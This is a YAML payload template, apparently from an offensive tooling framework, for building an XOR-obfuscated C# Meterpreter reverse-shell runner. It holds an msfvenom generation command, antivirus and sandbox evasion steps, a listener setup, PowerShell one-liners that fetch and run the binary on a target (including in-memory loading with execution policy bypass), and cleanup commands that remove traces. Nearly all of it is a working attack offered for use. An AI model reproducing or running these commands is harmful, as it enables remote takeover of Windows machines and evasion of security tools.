meta:
  name: "Simple Shellcode Runner, XOR (C#)"
  category: "Shellcode Execution"
  description: |
    Simple shellcode runner in C# with XOR encryption and sandbox evasion.
    
    Features:
    - XOR encryption for basic obfuscation (key: 0xfa)
    - Sleep-based sandbox detection (10 second delay)
    - Direct shellcode execution via VirtualAlloc + CreateThread
    - Minimal API footprint
    
    This is a straightforward runner suitable for initial access or testing.
    The sleep-based evasion helps bypass automated sandboxes that skip delays.
    
    WARNING: For authorized security testing only!

  effectiveness: medium

  mitre:
    tactic: "TA0002 - Execution"
    technique: "T1059.003 - Command and Scripting Interpreter: Windows Command Shell"

  artifacts:
    - "VirtualAlloc with PAGE_EXECUTE_READWRITE"
    - "CreateThread API calls"
    - "10-second sleep before execution"
    - "XOR-decoded shellcode in memory"
    - "Network connection to C2 server"

parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker/C2 server IP address for reverse connection"
    required: true

  - name: "lport"
    type: "port"
    description: "Listener port on attacker machine"
    required: true
    default: 443

  - name: "xor_key"
    type: "hex"
    description: "XOR encryption key (single byte, e.g., 'fa')"
    required: false
    default: fa

  - name: "output_file"
    type: "string"
    description: "Output executable filename"
    required: false
    default: "runner.exe"

  - name: "output_path"
    type: "path"
    description: "Output directory for generated payload"
    required: false
    default: "{config.output_dir}"

preprocessing:
  # Step 1: Generate raw shellcode using msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{ lhost }} LPORT={{ lport }} EXITFUNC=thread -f raw"
    output_var: "raw_shellcode"

  # Step 2: XOR encrypt the shellcode
  - type: "script"
    name: "xor_encryption"
    script: "xor_encrypt.py"
    args:
      data: "{{ raw_shellcode }}"
      key: "{{ xor_key }}"
    output_var: "xor_result"

  # Step 3: Format encrypted shellcode as C# byte array
  - type: "script"
    name: "format_payload"
    script: "format_csharp.py"
    args:
      data: "{{ xor_result.encrypted }}"
      var_name: "buf"
      bytes_per_line: 15
    output_var: "csharp_payload"

output:
  type: "template"
  template: "shellcode_runner/simple_runner.cs"
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
  launch_instructions: |
    C# Simple XOR Shellcode Runner - Launch Instructions

    Start Listener:
    msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"

    Transfer and Execute:
    python3 -m http.server 8080
    On target: powershell -c "IWR -Uri http://{{ lhost }}:8080/{{ output_file }} -OutFile {{ output_file }}; Start-Process {{ output_file }}"

    Alternative (SMB):
    impacket-smbserver share . -smb2support
    On target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && {{ output_file }}

    In-Memory Execution:
    python3 -m http.server 8080
    On target: powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}:8080/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [SimpleRunner.Program]::Main(@())"

    Notes:
    - XOR encrypted with key: 0x{{ xor_key }} (basic AV evasion)
    - 10-second sleep for sandbox evasion (sandboxes often skip delays)
    - Uses VirtualAlloc with RWX permissions for shellcode memory allocation
    - Executes shellcode in separate thread via CreateThread
    - EXITFUNC=thread ensures clean exit without crashing process
    - Reverse shell connects to {{ lhost }}:{{ lport }}
    - Requires x64 Windows system

    Troubleshooting:
    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
    - AV blocks: XOR is weak; consider AES encryption or packing (UPX, Enigma)
    - Payload waits 10 seconds before execution (by design for sandbox evasion)
    - Immediate termination: AV likely killed process; check Defender logs
    - Binary won't run: Windows SmartScreen or AppLocker blocking

    Cleanup:
    On target:
    taskkill /F /IM {{ output_file }} 2>nul
    del {{ output_file }}
